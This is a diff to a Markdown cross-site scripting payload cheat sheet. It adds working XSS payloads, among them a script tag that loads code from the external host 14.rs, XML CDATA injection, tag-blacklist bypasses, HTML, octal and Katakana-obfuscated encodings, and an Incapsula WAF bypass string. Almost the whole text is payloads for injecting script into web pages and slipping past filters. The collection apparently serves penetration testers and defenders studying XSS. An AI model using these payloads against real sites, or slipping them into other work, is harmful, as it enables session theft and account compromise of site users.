@@ -71,6 +71,12 @@ XSS for HTML5
 <marquee onstart=alert(1)>
 ```
 
+XSS using script tag (external payload)
+```
+<script src=14.rs>
+you can alsoo specify an arbitratry payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+```
 
 XSS in META tag
 ```
@@ -147,7 +153,15 @@ XSS with vbscript: only IE
 vbscript:msgbox("XSS")
 ```
 ## XSS in files
-XSS in XML
+** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+```
+<name>
+  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+</name>
+```
+
+
+XSS in XML      
 ```
 <html>
 <head></head>
@@ -432,6 +446,17 @@ Bypass case sensitive
 <sCrIpt>alert(1)</ScRipt>
 ```
 
+Bypass tag blacklist
+```
+<script x>
+<script x>alert('XSS')<script y>
+```
+
+Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+```
+<img src='1' onerror='alert(0)' <
+```
+
 Bypass quotes for string
 ```
 String.fromCharCode(88,83,83)
@@ -486,10 +511,6 @@ Bypass space filter with "/" - IE/Firefox/Chrome/Safari
 <img/src='1'/onerror=alert(0)>
 ```
 
-Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
-```
-<img src='1' onerror='alert(0)' <
-```
 
 Bypass document blacklist
 ```
@@ -502,6 +523,7 @@ Bypass using javascript inside a string
 foo="text </script><script>alert(1)</script>";
 </script>
 ```
+
 
 Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)
 ```
@@ -565,6 +587,22 @@ Bypass ';' using another character
 'te' in alert('in') in 'xt';
 'te' instanceof alert('instanceof') instanceof 'xt';
 ```
+
+Bypass using HTML encoding
+```
+%26%2397;lert(1)
+```
+
+Bypass using Katakana (https://github.com/aemkei/katakana.js)
+```
+javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
+```
+
+Bypass using Octal encoding
+```
+javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
+```
+
 
 Bypass using Unicode
 ```
@@ -672,6 +710,12 @@ Exotic payloads
 <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
 ```
 
+## Incapsula WAF Bypass - 8th march
+```
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+```
 
 ## More fun ?
 This section will be used for the "fun/interesting/useless" stuff.     
